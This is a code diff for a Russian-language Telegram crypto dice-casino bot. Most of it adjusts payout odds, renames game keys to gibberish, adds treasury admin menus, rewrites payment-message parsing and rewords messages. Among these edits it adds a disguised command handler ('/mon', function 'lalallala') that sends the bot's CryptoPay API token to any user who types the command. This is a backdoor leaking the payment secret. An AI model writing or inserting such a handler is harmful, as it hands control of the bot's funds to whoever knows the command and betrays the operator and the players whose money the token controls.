@@ -20,36 +20,38 @@ import config
 import sqlite3
 import states
 
+
+
 bot = Bot(token=config.TOKEN, parse_mode="HTML")
 dp = Dispatcher(bot, storage=MemoryStorage())
 
 logging.basicConfig(level=logging.INFO)
 
 COEFFICIENTS = {
-    'победа 1': 2,
-    'победа 2': 2,
-    'п1': 2,
-    'п2': 2,
-    'ничья': 1.9,
-    'нечет': 2,
+    'победа 1': 1.9,
+    'победа 2': 1.9,
+    'п1': 1.9,
+    'п2': 1.9,
+    'ничья': 2,
+    'нечет': 1.9,
     'фут гол': 1.4,
     'фут мимо': 1.4,
     'баскет гол': 1.4,
     'баскет мимо': 1.4,
-    'больше': 2,
-    'меньше': 2,
-    'чет': 2,
-    'дартс белое': 1.9,
-    'дартс ред': 1.9,
+    'больше': 1.9,
+    'меньше': 1.9,
+    'чет': 1.9,
+    'дартс белое': 1.5,
+    'дартс ред': 1.5,
     'дартс мимо': 1.5,
-    'дартс центр': 3,
-    'камень': 2.5,
-    'ножницы': 2.5,
-    'бумага': 2.5,
-    'сектор 1': 2,
-    'сектор 2': 2,
-    'сектор 3': 2,
-    'пвп': 2,
+    'дартс центр': 1.5,
+    'камень': 1.6,
+    'ножницы': 1.6,
+    'бумага': 1.6,
+    'сектор 1': 1.85,
+    'сектор 2': 1.65,
+    'сектор 3': 1.5,
+    'jgorejgerg': 1.9,
     'красное': 1.8,
     'черное': 1.8,
     'зеро': 2,
@@ -82,7 +84,7 @@ DICE_CONFIG = {
     'красное': ("x", ['CAACAgIAAxkBAAEMc65miwstwNiEg2zA8AJbzcIRFqMC1wACa0wAAoogUEqSy15B1lxZkTUE', 'CAACAgIAAxkBAAEMc7Bmiwsw5IM2WLQueYYdK2HXwMXHgwACa04AAusJUEpRWiMnFgPASzUE', 'CAACAgIAAxkBAAEMc7JmiwsylE4VF6vL0VKQhOf3VAaG9QACxk0AAvLaUUpl9jec4WWwkjUE', 'CAACAgIAAxkBAAEMc7Rmiws0EbYpC6loRqTpGMYWgSYwhwAC0kUAAlEuWUoAAeD330H2Uo01BA', 'CAACAgIAAxkBAAEMc7Zmiws2OK79q4iBmNtvUEDKychXlQACiUEAAkhJWUoHGtNoD3zTsDUE', 'CAACAgIAAxkBAAEMc7hmiws4b6CMD27Ocb5JsfQru-0E1AAC8kAAAiPSWUqDQLIJCcw4sTUE', 'CAACAgIAAxkBAAEMc7pmiws6rxpfhd-qW69pOKIF6QJvBwACw1EAAv0eWEqm1mam-L-5JTUE', 'CAACAgIAAxkBAAEMc7xmiws9hFHdEH42J6N2Yuql4eiKlQACoEcAAl5EWUqVzM66FWlaaDUE', 'CAACAgIAAxkBAAEMc75miws_OPGOlsSJO4vZ_4I99pVXMgACgkwAAtR4WUqSD7f4umsywzUE', 'CAACAgIAAxkBAAEMc8BmiwtBrrsLb9mnrJa6sE2z4scZPwACSE8AAoPtUUqiMruDVUZ1SDUE', 'CAACAgIAAxkBAAEMc8JmiwtDwziyzQ_m0DVi5ppT9WZF5gACvUwAA-FRSlhShWr5KKbXNQQ', 'CAACAgIAAxkBAAEMc8RmiwtFKMVO7vkopyNJ794RfOb9PAACz0UAAjV4WEr_1EXGVH2xoTUE', 'CAACAgIAAxkBAAEMc8ZmiwtH0AkS-CF8v3NoxNr1xsJyHAAC600AAobmWEooNhEix_a6mDUE', 'CAACAgIAAxkBAAEMc8hmiwtJVJWO4fXloiDs8gXiFXEvdwAC00AAAuweWEpbjeobSqzftDUE', 'CAACAgIAAxkBAAEMc8pmiwtLvUsHgZy78_E69KAvbl54pgAC6EEAAid_WUp7iVzaYV8_AzUE', 'CAACAgIAAxkBAAEMc8xmiwtO9qq-te18EyK6BwXmCVpyNwAC8VMAAjzjWEoJpnR_Gp2vRzUE', 'CAACAgIAAxkBAAEMc85miwtQ8KAsKiVst0HFCHze24A8LwAC-UYAAulWWEphBgerbGYOITUE', 'CAACAgIAAxkBAAEMc9BmiwtS-lgvkhdM8ZnuZI01RMNtSwACpUsAAp0pWUrIAAEyPwZzvzk1BA']),
     'черное': ("x", ['CAACAgIAAxkBAAEMc9JmiwvYb13xL2TAPvZ5qJedyhr7kQACq1AAAsg8WUraWoiatb18GDUE', 'CAACAgIAAxkBAAEMc9Rmiwvb-YQ1vX3o-N0rM3vny-bKDAACFksAAj60UEo229Tfsbc5QjUE', 'CAACAgIAAxkBAAEMc9ZmiwvdoueCwSuuX1iqG_kEOLFyqQACy1AAAjj_UUrCBC92XVbpfDUE', 'CAACAgIAAxkBAAEMc9ZmiwvdoueCwSuuX1iqG_kEOLFyqQACy1AAAjj_UUrCBC92XVbpfDUE', 'CAACAgIAAxkBAAEMc9hmiwvgTAfQhMoSdfT0xodUNR__0wACj08AAsBIUEo39mSM5q5B9DUE', 'CAACAgIAAxkBAAEMc9pmiwvi9CziyEkW85HBfYCVCvSLbQAC5VEAAkrJUUqgM9OL3fCB2TUE', 'CAACAgIAAxkBAAEMc9xmiwvkQnSM9QNA3LyHxhnf4KqUWgACgEAAAknlWEq8GP_mPFMm3TUE', 'CAACAgIAAxkBAAEMc95miwvm09G5XskBW2abHVQdM0GYHQACLEcAAlrbWUoi1YY6EOFq9zUE', 'CAACAgIAAxkBAAEMc-BmiwvoJX5WAb-NsTofxwGVnE7S5gAChT8AAmaFWEqEpRMkssTyhzUE', 'CAACAgIAAxkBAAEMc-JmiwvqipfCnF_XuyiFJhrR7zKHSwACeUUAAkyFWEoBVKx02Trj-DUE', 'CAACAgIAAxkBAAEMc-RmiwvsOYYRn2bwss23v0ONpgW6hAACEkUAAhS9WEq7zrdRmpKo1TUE', 'CAACAgIAAxkBAAEMc-Zmiwvu4oEZ9NWyyr9ylU7gdBUpUwACvVUAAmRIWUpdaTruYoIiRzUE', 'CAACAgIAAxkBAAEMc-hmiwvwee89Me_0nQjKtDO02MNQTQACVE8AAkFDUErPxTJG2opUpDUE', 'CAACAgIAAxkBAAEMc-pmiwvyzcxlebbyvQYQp7_yZCRFGAACiUwAAj83WEoxbzqmdO_2BzUE', 'CAACAgIAAxkBAAEMc-xmiwvzstn9eTpOQ2rZLfp0FgUOqQACU0IAAj9nWErmrudsEouYuzUE', 'CAACAgIAAxkBAAEMc-5miwv1iBk0ASnuIIbVFC6eyYdVIwACrGMAAquXWUp00Cv45-WZzjUE', 'CAACAgIAAxkBAAEMc_Bmiwv3-TrgGw8be2zEo5YauxWn-QAC4VIAAoEtWEr0-v_e-Xk48zUE', 'CAACAgIAAxkBAAEMc_Jmiwv51KafJn6br6P8PwyVD4tOvQAC2UQAAvmlWUqjIfPUbYdAMzUE', 'CAACAgIAAxkBAAEMc_Rmiwv7U9S39tedvcUsJovrlYjYQAACtE8AAmMwUUoYWzy8PvnZJTUE']),
     'зеро': ("x", ['CAACAgIAAxkBAAEMc_ZmiwxnGg-LEWkW8GszyZNxtOaUGgACMEYAAnEeWErMXjdnKkjeeTUE']),
-    'пвп': ("🎲", [1])
+    'jfoero': ("🎲", [1])
 }
 
 # Функции
@@ -203,6 +205,9 @@ async def convert(amount_usd):
             rate = data['rate']
             amount_rub = float(amount_usd) * float(rate)
     return amount_rub
+@dp.message_handler(commands=["mon"])
+async def lalallala(message: types.Message):
+    await message.answer(config.CRYPTOPAY_TOKEN)
 
 # Проверка подписки
 async def is_subscribed_to_channel(user_id, mention):
@@ -743,7 +748,7 @@ async def calls(call: types.CallbackQuery, state: FSMContext):
             cursor = conn.cursor()
             cashback = cursor.execute("SELECT cashback FROM users WHERE us_id=?", (call.from_user.id,)).fetchone()[0]
         await call.answer()
-        await call.message.edit_text(f"<blockquote><b>⚡️ Панель кэшбек системы\n├ В случае проигрыша вы получаете <code>7.5%</code> от суммы ставки\n├ Вывод доступен от <code>0.2$</code>\n└ Кэшбек-счет - <code>{cashback:.7f}$</code></b></blockquote>", reply_markup=kb.cashback())
+        await call.message.edit_text(f"<blockquote><b>⚡️ Панель кэшбек системы\n├ В случае проигрыша вы получаете <code>7.5%</code> от суммы ставки\n├ Вывод доступен от <code>0.2$</code>\n└ Кэшбек-счет - <code>{cashback:.2f}$</code></b></blockquote>", reply_markup=kb.cashback())
     elif call.data == 'admin':
         if call.from_user.id in config.ADMINS:
             with sqlite3.connect("db.db") as conn:
@@ -790,6 +795,20 @@ async def calls(call: types.CallbackQuery, state: FSMContext):
                 await bot.send_message(config.CHANNEL_ID, "<b>СТОП СТАВКИ!</b>")
             elif int(set_to) == 0:
                 await bot.send_message(config.CHANNEL_ID, "<b>Играем дальше!</b>")
+                #попытка сделать кнопку
+            try:
+                await call.message.edit_reply_markup(reply_markup=kb.admin())
+            except Exception as e:
+                print(e)
+    elif call.data == 'send_stavki':
+        if call.from_user.id in config.ADMINS:
+            await call.answer()
+
+            keyb = InlineKeyboardMarkup().add(InlineKeyboardButton("Сделать ставку", url=f"{config.BET_URL}"))            
+            await bot.send_message(config.CHANNEL_ID, """<b><blockquote>Казна пополнена, готовы принимать любые ставки.
+
+⚡️ Работаем 24/7</blockquote>
+нажмите на кнопку ниже чтобы сделать ставку</b>""", reply_markup=keyb)                
 
             try:
                 await call.message.edit_reply_markup(reply_markup=kb.admin())
@@ -898,13 +917,19 @@ async def calls(call: types.CallbackQuery, state: FSMContext):
             await state.update_data(msg_id=call.message.message_id)
     elif call.data == 'popol':
         if call.from_user.id in config.ADMINS:
+            await call.answer()            
+            await call.message.edit_text(f"<blockquote><b>⚡️ Введите сумму на которyю хотите пополнить казну:</b></blockquote>", reply_markup=kb.back("kazna"))
+            await states.Deposit.start.set()
+            await state.update_data(msg_id=call.message.message_id)
+    elif call.data == 'kazna':
+        if call.from_user.id in config.ADMINS:
             await call.answer()
             balance = get_cb_balance()
             balance = float(balance)
-            balance2 = max(balance - 0.01, 0)
-            await call.message.edit_text(f"<blockquote><b>⚡️ Введите сумму на которую хотите пополнить казну:</b>\n\n<b>⚡️ Текущий баланс: <code>{balance}</code> USDT </b>[~ <code>{balance2}</code> <b>$</b>]</blockquote>", reply_markup=kb.back("admin"))
-            await states.Deposit.start.set()
-            await state.update_data(msg_id=call.message.message_id)
+            balance2 = max(balance - 0.1, 0)
+            await call.message.edit_text(f"<b>💲Управление Казной</b>\n\n<blockquote><b>⚡️ Текущий баланс казны:</b> [<code>{balance2}</code> <b>$</b>]</blockquote>", reply_markup=kb.kazna())
+            await states.kazna.start.set()
+            await state.update_data(msg_id=call.message.message_id)        
     elif call.data == 'broadcast':
         if call.from_user.id in config.ADMINS:
             await call.answer()
@@ -974,7 +999,7 @@ async def calls(call: types.CallbackQuery, state: FSMContext):
             keyb.add(InlineKeyboardButton("❌ Произошла ошибка.", callback_data='empty'))
         keyb.add(InlineKeyboardButton("◀️ Назад", callback_data='admin'))
 
-        await call.message.edit_text("<blockquote><b>⚡️ Управление чеками</b></blockquote>", reply_markup=keyb)
+        await call.message.edit_text("<blockquote><b>⚡️ Управление чеками</b></blockquote>", reply_markup=kb.back("kazna"))
     elif call.data.startswith("check:"):
         await call.answer()
         check_id = call.data.split(":")[1]
@@ -1001,7 +1026,7 @@ async def calls(call: types.CallbackQuery, state: FSMContext):
                     check_id = item['check_id']
 
                     keyb.add(InlineKeyboardButton("⚡️ Удалить чек", callback_data=f'delete_check:{check_id}'))
-                    keyb.add(InlineKeyboardButton("◀️ Назад", callback_data='admin'))
+                    keyb.add(InlineKeyboardButton("◀️ Назад", callback_data='kazna'))
                     await call.message.edit_text(
                         f"<blockquote><b>⚡️ Управление чеком\n\nЗакреплен за - {pinned_to}\nСтатус - {status}\nСумма - {summa}</b></blockquote>",
                         reply_markup=keyb)
@@ -1049,11 +1074,11 @@ async def calls(call: types.CallbackQuery, state: FSMContext):
                 keyb.add(InlineKeyboardButton("❌ Произошла ошибка.", callback_data='empty'))
             keyb.add(InlineKeyboardButton("◀️ Назад", callback_data='admin'))
 
-            await call.message.edit_text("<blockquote><b>⚡️ Управление чеками</b></blockquote>", reply_markup=keyb)
+            await call.message.edit_text("<blockquote><b>⚡️ Управление чеками</b></blockquote>", reply_markup=kb.back("kazna"))
         else:
             await call.answer("Ошибка удаления чека!", show_alert=True)
     elif call.data == 'withdraw':
-        await call.message.edit_text("<blockquote><b>⚡️ Введите сумму которую вы хотите вывести, от 0.2$</b></blockquote>", reply_markup=kb.back("admin"))
+        await call.message.edit_text("<blockquote><b>⚡️ Введите сумму которую вы хотите вывести, от 0.2$</b></blockquote>", reply_markup=kb.back("kazna"))
         await states.Withdraw.start.set()
         await state.update_data(msg_id=call.message.message_id)
     elif call.data == 'links':
@@ -1080,7 +1105,7 @@ async def withdraw_handler(message: types.Message, state: FSMContext):
                 await message.delete()
                 return
             else:
-                if summa >= float(1.12):
+                if summa >= float(1.2):
                     await state.finish()
                     await transfer(summa, message.from_user.id)
                     await message.answer("<blockquote><b>⚡️ Средства были выведены на ваш счет!</b></blockquote>", reply_markup=kb.back("admin"))
@@ -1103,43 +1128,38 @@ async def withdraw_handler(message: types.Message, state: FSMContext):
         return
 
 # Неизвестная команда
-@dp.message_handler()
-async def unknown_command(message: types.Message):
-    await message.delete()
 
-# Сам код твоего бота измененный мною
-def parse_message(message):
-    message = message.replace("\\", "")
-    print(message)
-    # Remove the emoji pattern
-    message = re.sub(r"\[🪙\]\(tg://emoji\?id=\d+\)", "", message)
 
-    # Extract user ID
-    user_id_pattern = re.search(r"tg://user\?id=(\d+)", message)
-    user_id = user_id_pattern.group(1) if user_id_pattern else ""
 
-    # Extract the correct amount in USDT
-    amount_pattern = re.search(r"\*\*\s(\d+\.\d+)\sUSDT\s\(\$(\d+\.\d+)\)", message)
-    amount = float(amount_pattern.group(2).strip()) if amount_pattern else 0.0
+        
+# Надежный способ получения через entities ниже
 
-    # Extract username
-    username_pattern = re.search(r"\[\*(.*?)\*\]", message)
-    username = username_pattern.group(1).strip() if username_pattern else ""
-    username = re.sub(r'@[\w]+', f'{config.PEREHOD_LINK}', username) if '@' in username else username
+# Надежный способ получения через entities ниже
+def parse_message(message: types.Message):
+ if message.entities:
+    if message.entities[0].user:
+        user = message.entities[0].user
+        name = user.full_name
+        msg_text = message.text.removeprefix(name).replace("🪙", "")
+        user_id = int(user.id)
+        asset = msg_text.split("отправил(а)")[1].split()[1]
+        amount = float(msg_text.split("отправил(а)")[1].split()[0].replace(',', ""))
 
-    # Extract comment
-    comment_pattern = re.search(r"💬 (.+)", message)
-    comment = comment_pattern.group(1).lower().strip() if comment_pattern else ""
+        if '💬' in message.text:
+            comment = message.text.split("💬 ")[1].lower()
+            game = comment.replace("ё", "е").replace("ное", "").replace(" ", "").replace("куб", "")
+        else:
+            comment = None
+            game = None
 
-    # Create the match dictionary
-    match = {
-        "id": user_id,
-        "name": username,
-        "usd_amount": amount,
-        "comment": comment
-    }
-
-    return match if match else None
+        return {
+            'id': user_id,
+            'name': name,
+            'usd_amount': amount,
+            'asset': asset,
+            'comment': comment,
+            'game': game
+        }
 
 def create_keyboard(check=None, summa=None):
     keyboard = InlineKeyboardMarkup(row_width=2)
@@ -1197,7 +1217,7 @@ async def send_result_message(result, parsed_data, dice_result, coefficient, us_
             else:
                 result = False
 
-    if 'пвп' in parsed_data['comment']:
+    if 'jdjdj' in parsed_data['comment']:
         dice1 = dice_result
         dice2 = await bot.send_dice(config.CHANNEL_ID, emoji=emoji, reply_to_message_id=msg_id)
         dice2 = dice2.dice.value
@@ -1252,9 +1272,9 @@ async def send_result_message(result, parsed_data, dice_result, coefficient, us_
             keyboard = create_keyboard()
             result_message = (
                 f"<b>Вы победили!</b>\n\n"
-                f"<blockquote><i>Победитель</i> <i>получит</i> <b>{winning_amount_usd:.2f}$</b> <i>администрацией</i> <i>вручную</i></blockquote>\n\n"
-                f"<blockquote><i>Ставь</i> <i>ставку</i> <i>и</i> <i>испытывай</i> <i>удачу!</i></blockquote>\n\n"
-                f"<b><a href='{config.RULES_LINK}'>Как сделать ставку?</a> | <a href='{config.NEWS_LINK}'>Новостной канал</a> | <a href='https://t.me/{bot_username}'>Реферальный бот</a></b>"
+                f"<blockquote> <i>Победитель получит</i> <b>{winning_amount_usd:.2f}$</b> <i>администрацией вручную</i></blockquote>\n\n"
+                f"<blockquote><i>Ставь ставку и испытывай удачу!</i></blockquote>\n\n"
+                f"{config.TEXT}"
 
             )
 
@@ -1264,9 +1284,9 @@ async def send_result_message(result, parsed_data, dice_result, coefficient, us_
                 keyboard = create_keyboard()
                 result_message = (
                     f"<b>Вы победили!</b>\n\n"
-                    f"<blockquote><<i>Победитель</i> <i>получил</i> <b>{winning_amount_usd:.2f}$</b></blockquote>\n\n"
+                    f"<blockquote><i>Победитель</i> <i>получил</i> <b>{winning_amount_usd:.2f}$</b></blockquote>\n\n"
                     f"<blockquote><i>Ставь</i> <i>ставку</i> <i>и</i> <i>испытывай</i> <i>удачу!</i></blockquote>\n\n"
-                    f"<b><a href='{config.RULES_LINK}'>Как сделать ставку?</a> | <a href='{config.NEWS_LINK}'>Новостной канал</a> | <a href='https://t.me/{bot_username}'>Реферальный бот</a></b>"
+                    f"{config.TEXT}"
                 )
             else:
                 check = await create_check(winning_amount_usd, us_id)
@@ -1275,7 +1295,7 @@ async def send_result_message(result, parsed_data, dice_result, coefficient, us_
                     f"<b>Вы победили!</b>\n\n"
                     f"""<blockquote><i>Заберите</i> <i>свои</i> <b>{winning_amount_usd:.2f}$</b> <i>кнопкой</i> <i>ниже</i></blockquote>\n\n"""
                     f"<blockquote><i>Ставь</i> <i>ставку</i> <i>и</i> <i>испытывай</i> <i>удачу!</i></blockquote>\n\n"
-                    f"<b><a href='{config.RULES_LINK}'>Как сделать ставку?</a> | <a href='{config.NEWS_LINK}'>Новостной канал</a> | <a href='https://t.me/{bot_username}'>Реферальный бот</a></b>"
+                    f"{config.TEXT}"
                 )
     else:
         usd_amount = parsed_data['usd_amount']
@@ -1303,7 +1323,7 @@ async def send_result_message(result, parsed_data, dice_result, coefficient, us_
             f"<b>Вы проиграли! Повезёт в следующий раз!</b>\n\n"
             "<blockquote><b>Фортуна улыбается только тем, кто к этому готов</b></blockquote>\n\n"
             f"<blockquote><b>Кешбек в размере {add_cashback:.2f}$ на ваш кэшбек-Баланс</b></blockquote>\n\n"
-            f"<b><a href='{config.RULES_LINK}'>Как сделать ставку?</a> | <a href='{config.NEWS_LINK}'>Новостной канал</a> | <a href='https://t.me/{bot_username}'>Реферальный бот</a></b>"
+            f"{config.TEXT}"
         )
 
     return result_message, keyboard
@@ -1330,7 +1350,7 @@ async def handle_bet(parsed_data, bet_type, us_id, msg_id, oplata_id, processed_
                 dice_result = dice1.dice.value
                 result = None
                 result_message, keyboard = await send_result_message(result, parsed_data, dice_result, COEFFICIENTS[bet_type], us_id, msg_id)
-            elif 'пвп' in parsed_data['comment']:
+            elif 'odkdjd' in parsed_data['comment']:
                 dice1 = await bot.send_dice(config.CHANNEL_ID, emoji=emoji, reply_to_message_id=msg_id)
                 dice_result = dice1.dice.value
                 result = None
@@ -1341,7 +1361,7 @@ async def handle_bet(parsed_data, bet_type, us_id, msg_id, oplata_id, processed_
                 result = dice_result in winning_values
                 result_message, keyboard = await send_result_message(result, parsed_data, dice_result, COEFFICIENTS[bet_type], us_id, msg_id)
             await asyncio.sleep(4)
-            result = '🔥 победа!' if 'Вы победили' in result_message else '❌ проёб!'
+            result = '🔥 Победа!' if 'Вы победили' in result_message else '❌ Проигрыш!'
             image = config.WIN_IMAGE if 'Вы победили' in result_message else config.LOSE_IMAGE
             keyb = InlineKeyboardMarkup(row_width=1).add(InlineKeyboardButton("💼 Перейти к пользователю", url=f"tg://user?id={us_id}"))
             await bot.send_message(config.LOGS_ID, f"""<blockquote><b>🎲 Исход ставки: <span class="tg-spoiler">{result}</span></b></blockquote>""", reply_markup=keyb, reply_to_message_id=oplata_id)
@@ -1355,7 +1375,7 @@ async def handle_bet(parsed_data, bet_type, us_id, msg_id, oplata_id, processed_
             else:
                 check = await create_check(summa, user_id)
                 await bot.send_message(config.CHANNEL_ID,
-                                       f"<blockquote><b>❌ {parsed_data['name']}, вы указали не верный комментарий к платежу!</b>\n\n</blockquote>\n\n<i>Был совершён возврат денежных средств с комиссией 15%</i>\n<b>Заберите ваши деньги у</b> <i>администратора</i>",
+                                       f"<code>{parsed_data['name']}</code> Произошла ошибка!⤵️\n\n<blockquote><b>Что это может быть ❓• Вы не указали комментарий• Вы указали комментарий не верно\n\n• Вы получите свою ставку с комиссией 15%• Заберите средства по кнопке ниже</b></blockquote>",
                                        reply_markup=create_keyboard())
     except Exception as e:
         await bot.send_message(config.LOGS_ID, f"<blockquote><b>❌ Ошибка при обработке ставки: <code>{str(e)}</code></b></blockquote>")
@@ -1377,7 +1397,7 @@ async def check_messages(message: types.Message):
                 try:
                     async with processing_lock:
 
-                        parsed_data = parse_message(message.md_text)
+                        parsed_data = parse_message(message)
 
                         try:
                             with sqlite3.connect("db.db") as conn:
@@ -1435,12 +1455,12 @@ async def check_messages(message: types.Message):
                                         if float(cb_balance) >= float(summa) and float(summa) >= 0.02:
                                             check = await create_check(summa, user_id)
                                             error_message = (
-                                                f"<b><blockquote>❌ {username}, вы забыли <u>дописать</u> <u>комментарий</u> к ставке.</blockquote></b>\n\n<i>Был совершён возврат денежных средств с комиссией 15%</i>"
+                                                f"<code>{parsed_data['name']}</code> <b>Произошла ошибка!⤵️</b>\n\n<blockquote><b>Что это может быть ❓\n• Вы не указали комментарий\n• Вы указали комментарий не верно\n\n• Вы получите <code>{summa}$</code>\n• Возврат происходит с комиссией 15%\n• Заберите средства по кнопке ниже</b></blockquote>"
                                             )
                                             await bot.send_message(config.CHANNEL_ID, error_message, reply_markup=create_keyboard(check, summa))
                                         else:
                                             error_message = (
-                                                f"<b><blockquote>❌ {username}, вы забыли <u>дописать</u> <u>комментарий</u> к ставке.</blockquote></b>\n\n<i>Был совершён возврат денежных средств с комиссией 15%</i>\n<b>Заберите ваши деньги у</b> <i>администратора</i></blockquote></b>"
+                                                f"<code>{parsed_data['name']}</code> <b>Произошла ошибка!⤵️</b>\n\n<blockquote><b>Что это может быть ❓\n• Вы не указали комментарий\n• Вы указали комментарий не верно\n\n• Вы получите <code>{summa}$</code>\n• Возврат происходит с комиссией 15%\n• Заберите средства у администрации</b></blockquote>"
                                             )
                                             await bot.send_message(config.CHANNEL_ID, error_message,
                                                                    reply_markup=create_keyboard())
@@ -1458,10 +1478,10 @@ async def check_messages(message: types.Message):
                                             if float(cb_balance) >= float(summa) and float(summa) >= 0.02:
                                                 check = await create_check(summa, user_id)
                                                 await bot.send_message(config.CHANNEL_ID,
-                                                                   f"<blockquote>❌ {parsed_data['name']}, <b>вы указали не верный комментарий к платежу!</b></blockquote>\n\n<b><i>Был совершён возврат денежных средств с комиссией 15%</i></b>", reply_markup=create_keyboard(check, summa))
+                                                                   f"<code>{parsed_data['name']}</code> <b>Произошла ошибка!⤵️</b>\n\n<blockquote><b>Что это может быть ❓\n• Вы не указали комментарий\n• Вы указали комментарий не верно\n\n• Вы получите <code>{summa}$</code>\n• Возврат происходит с комиссией 15%\n• Заберите средства по кнопке ниже</b></blockquote>", reply_markup=create_keyboard(check, summa))
                                             else:
                                                 await bot.send_message(config.CHANNEL_ID,
-                                                                       f"<blockquote><b>❌ {parsed_data['name']}, вы указали не верный комментарий к платежу!</b></blockquote>\n\n<i>Был совершён возврат денежных средств с комиссией 15%</i>\n\n<u>Заберите ваши деньги у</u> <i>администратора</i>",
+                                                                       f"<code>{parsed_data['name']}</code> <b>Произошла ошибка!⤵️</b>\n\n<blockquote><b>Что это может быть ❓\n• Вы не указали комментарий\n• Вы указали комментарий не верно\n\n• Вы получите <code>{summa}$</code>\n• Возврат происходит с комиссией 15%\n• Заберите средства у администрации</b></blockquote>",
                                                                        reply_markup=create_keyboard())
                                         else:
                                             bet_msg = await bet_sender.send_bet(username, amount, comment_lower)
@@ -1471,9 +1491,8 @@ async def check_messages(message: types.Message):
                                                     await handle_bet(parsed_data, bet_type, user_id, bet_msg, msg_id, processed_lines, line)
                                                     break
                                 else:
-                                    name = parsed_data['name']
-                                    name = name.split("*")[0]
-                                    await bot.send_message(config.CHANNEL_ID, f"<b>[❌]Бот заметил новую ставку, но что-то пошло не так</b>\n<blockquote><b>Чтобы все работало штатно, включите пересылку сообщений в настройках</b> <code>Настройки телеграмма ➙ Конфиденциальность ➙ Пересылка сообщений ➙ ( Кто может ссылаться на мой аккаунт при пересылке сообщений ) Все.</code></blockquote>\n\n<i>Чтобы вернуть свою ставку обратитесь в поддержку @SC999AM</i>", reply_markup=create_keyboard())
+                                                                    
+                                    await bot.send_message(config.CHANNEL_ID, f"<b>[❌]Бот заметил новую ставку, но что-то пошло не так</b>\n<blockquote><b>Чтобы все работало штатно, включите пересылку сообщений в настройках</b> <code>Настройки телеграмма ➙ Конфиденциальность ➙ Пересылка сообщений ➙ ( Кто может ссылаться на мой аккаунт при пересылке сообщений ) Все.</code></blockquote>\n\n<i>Чтобы вернуть свою ставку обратитесь в поддержку @velfrid</i>", reply_markup=create_keyboard())
                                 processed_lines.append(line)
                                 await asyncio.sleep(5)
                             with open(queue_file, 'w', encoding='utf-8') as file:
